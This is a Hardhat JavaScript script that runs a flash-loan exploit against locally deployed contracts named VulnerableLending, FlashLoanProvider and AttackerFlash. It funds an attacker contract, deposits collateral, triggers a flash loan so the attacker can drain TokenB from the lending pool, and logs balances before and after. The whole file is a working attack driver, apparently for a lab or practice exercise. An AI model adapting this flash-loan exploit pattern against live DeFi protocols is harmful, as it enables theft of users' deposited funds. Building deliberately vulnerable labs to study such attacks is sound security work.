// scripts/runFlashExploit.js
const hre = require("hardhat");

async function main() {
  const [deployer, attackerEOA] = await hre.ethers.getSigners();

  // --- Deployed addresses (use the ones from your deploy output) ---
  const FLASH_PROVIDER_ADDR     = "0x8A791620dd6260079BF849Dc5567aDC3F2FdC318";
  const ATTACKER_CONTRACT_ADDR  = "0xA51c1fc2f0D1a1b8494Ed1FE312d7C3a78Ed91C0";
  const TOKENA_ADDR             = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
  const TOKENB_ADDR             = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512";
  const AMM_ADDR                = "0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0";
  const LENDING_ADDR            = "0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9";

  // Attach to deployed contracts
  const FlashFactory = await hre.ethers.getContractFactory("FlashLoanProvider");
  const AttackerFactory = await hre.ethers.getContractFactory("AttackerFlash");
  const TokenA = await hre.ethers.getContractAt("TokenA", TOKENA_ADDR);
  const TokenB = await hre.ethers.getContractAt("TokenB", TOKENB_ADDR);
  const Lending = await hre.ethers.getContractAt("VulnerableLending", LENDING_ADDR);

  const flash = FlashFactory.attach(FLASH_PROVIDER_ADDR);
  const attacker = AttackerFactory.attach(ATTACKER_CONTRACT_ADDR);

  // helper to print balances
  async function printBalances(tag) {
    const flashA = await TokenA.balanceOf(FLASH_PROVIDER_ADDR);
    const lendingB = await TokenB.balanceOf(LENDING_ADDR);
    const attackerA = await TokenA.balanceOf(ATTACKER_CONTRACT_ADDR);
    const attackerB = await TokenB.balanceOf(ATTACKER_CONTRACT_ADDR);
    console.log(`\n=== ${tag} ===`);
    console.log("FlashProvider TokenA:", hre.ethers.formatEther(flashA));
    console.log("Lending pool TokenB:", hre.ethers.formatEther(lendingB));
    console.log("AttackerContract TokenA:", hre.ethers.formatEther(attackerA));
    console.log("AttackerContract TokenB:", hre.ethers.formatEther(attackerB));
  }

  await printBalances("BEFORE");

  // --- Ensure attacker CONTRACT has collateral deposited in the lending pool ---
  const collateralAmount = hre.ethers.parseEther("100"); // amount to be registered as collateral
  const flashAmount = hre.ethers.parseEther("800"); // amount we'll request from flash provider
  // FlashLoanProvider feeBP = 5 (0.05%), compute owed = flashAmount + fee
  const feeBP = 5n;
  const feeBN = (flashAmount * feeBP) / 10000n;
  const owedBN = flashAmount + feeBN;

  console.log(`\nWe will request ${hre.ethers.formatEther(flashAmount)} TokenA in the flash loan; owed will be ${hre.ethers.formatEther(owedBN)} (includes fee).`);
  console.log(`Transferring collateral + repay reserve to attacker contract and depositing collateral...`);

  // Transfer (collateral + repay reserve) so attacker keeps repay reserve after deposit
  const totalToTransfer = collateralAmount + owedBN;
  const tx1 = await TokenA.connect(deployer).transfer(ATTACKER_CONTRACT_ADDR, totalToTransfer);
  await tx1.wait();
  console.log(`Transferred ${hre.ethers.formatEther(totalToTransfer)} TokenA to attacker contract.`);

  // Now deposit the collateral amount (attacker contract will move collateralAmount into lending, leaving owedBN in attacker)
  const tx2 = await attacker.connect(deployer).depositMyCollateral(collateralAmount);
  await tx2.wait();
  console.log(`Deposited ${hre.ethers.formatEther(collateralAmount)} TokenA as collateral for attacker contract.`);

  // quick check: read collateral recorded for attacker contract from the lending contract
  const collRecorded = await Lending.collateralA(ATTACKER_CONTRACT_ADDR);
  console.log("Collateral recorded for attacker contract (A):", hre.ethers.formatEther(collRecorded));

  await printBalances("AFTER COLLATERAL DEPOSIT");

  // call the flash loan provider to lend flashAmount TokenA to the attacker contract (atomic)
  console.log(`\nInvoking flashLoan for ${hre.ethers.formatEther(flashAmount)} TokenA to attacker contract...`);

  const tx = await flash.connect(deployer).flashLoan(ATTACKER_CONTRACT_ADDR, flashAmount, "0x");
  const rcpt = await tx.wait();
  console.log("flashLoan tx:", rcpt.transactionHash);

  await printBalances("AFTER FLASH");

  // show attacker EOA TokenB balance (profit forwarded to EOA if attacker contract does so)
  const attackerEOABalB = await TokenB.balanceOf(attackerEOA.address);
  console.log("\nAttacker EOA TokenB balance:", hre.ethers.formatEther(attackerEOABalB));
}

main().catch((e) => { console.error(e); process.exitCode = 1; });

